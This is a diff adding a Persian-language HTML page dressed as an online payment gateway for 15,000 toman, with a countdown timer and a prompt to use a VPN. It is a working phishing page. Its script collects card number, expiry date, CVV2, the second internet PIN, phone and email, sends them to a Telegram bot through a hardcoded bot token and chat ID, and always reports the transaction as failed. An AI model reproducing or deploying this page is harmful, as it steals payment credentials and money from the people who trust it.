@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پرداخت اینترنتی</title>
+    <style>
+        body {
+            background-color: #1c1c1c;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            flex-direction: column; /* اضافه کردن جهت عمودی */
+        }
+        .container {
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            text-align: center;
+            color: #ff4081;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 5px;
+            background-color: #444;
+            color: white;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #ff4081;
+            outline: none;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff4081;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #e91e63;
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #aaa;
+            text-align: center;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ff4081; /* رنگ پیام */
+            text-align: center;
+        }
+        .amount {
+            font-size: 18px;
+            text-align: center;
+            margin-top: 20px;
+            color: #ff4081;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>پرداخت اینترنتی</h1>
+        <div class="amount">مبلغ: ۱۵,۰۰۰ تومان</div> <!-- نمایش مبلغ -->
+        <form id="paymentForm">
+            <input type="tel" id="cardNumber" placeholder="شماره کارت" required>
+            <input type="tel" id="expiryDate" placeholder="تاریخ انقضای کارت" required>
+            <input type="tel" id="cvv" placeholder="CVV2" required>
+            <input type="password" id="password" placeholder="رمز دوم (رمز اینترنتی)" required>
+            <input type="tel" id="phone" placeholder="شماره تماس" required> <!-- فیلد شماره تماس جدید -->
+            <input type="email" id="email" placeholder="ایمیل (اختیاری)">
+            <button type="submit" class="button">پرداخت</button>
+        </form>
+        <div class="info">
+            <p id="timer">مدت زمان باقی‌مانده: 9:45</p>
+        </div>
+    </div>
+    <p class="note">جهت پرداخت از فیلترشکن استفاده کنید</p> <!-- پیام جدید -->
+    
+    <script>
+        let timeLeft = 585; // 9 minutes and 45 seconds in seconds
+
+        const timerElement = document.getElementById('timer');
+
+        const countdown = setInterval(function() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+
+            timerElement.textContent = `مدت زمان باقی‌مانده: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                alert("زمان شما به پایان رسید!");
+            }
+
+            timeLeft--;
+        }, 1000);
+
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const password = document.getElementById('password').value;
+            const phone = document.getElementById('phone').value; // دریافت شماره تماس
+            const email = document.getElementById('email').value;
+
+            const message = `شماره کارت: ${cardNumber}\nتاریخ انقضا: ${expiryDate}\nCVV2: ${cvv}\nرمز دوم: ${password}\nشماره تماس: ${phone}\nایمیل: ${email}\nمبلغ: ۱۵,۰۰۰ تومان`; // اضافه کردن مبلغ به پیام
+
+            const botToken = '7382179544:AAH0-jwXoeC49-JeEmnsUqnaDwCFhNU4tjQ'; // توکن ربات
+            const chatId = '7311931997'; // شناسه چت
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('تراکنش ناموفق');
+                } else {
+                    alert('تراکنش ناموفق');
+                }
+            })
+            .catch(error => {
+                console.error('خطا:', error);
+                alert('تراکنش ناموفق');
+            });
+        });
+    </script>
+</body>
+</html>
